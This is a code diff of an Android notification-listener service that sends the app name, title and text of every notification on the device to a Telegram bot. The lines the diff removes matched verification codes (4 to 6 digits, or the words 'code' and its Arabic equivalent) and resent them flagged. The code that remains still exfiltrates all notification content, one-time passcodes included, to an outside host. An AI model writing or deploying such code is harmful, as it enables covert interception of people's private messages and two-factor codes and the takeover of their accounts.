@@ -24,16 +24,11 @@ public class NotifyService extends NotificationListenerService {
         String title = extras.getString(Notification.EXTRA_TITLE, "");
         String text = extras.getString(Notification.EXTRA_TEXT, "");
         String pkg = sbn.getPackageName();
-        
+
         if (title.isEmpty() && text.isEmpty()) return;
-        
+
         String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
         sendToTelegram(message);
-        
-        // كشف رموز التحقق
-        if (text.contains("رمز") || text.contains("code") || text.matches(".*\\d{4,6}.*")) {
-            sendToTelegram("🔐 **Code detected:** " + text);
-        }
     }
 
     private void sendToTelegram(String text) {
@@ -41,11 +36,10 @@ public class NotifyService extends NotificationListenerService {
             Request request = new Request.Builder()
                     .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                     .post(new FormBody.Builder()
-                        .add("chat_id", CHAT_ID)
-                        .add("text", text)
-                        .build())
+                            .add("chat_id", CHAT_ID)
+                            .add("text", text)
+                            .build())
                     .build();
-            
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override public void onResponse(Call call, Response response) {
                     try { response.close(); } catch (Exception e) {}
@@ -57,6 +51,6 @@ public class NotifyService extends NotificationListenerService {
 
     @Override
     public void onListenerConnected() {
-        sendToTelegram("✅ Notification Service Connected - All notifications will be sent");
+        sendToTelegram("✅ Notification Service Connected");
     }
 }
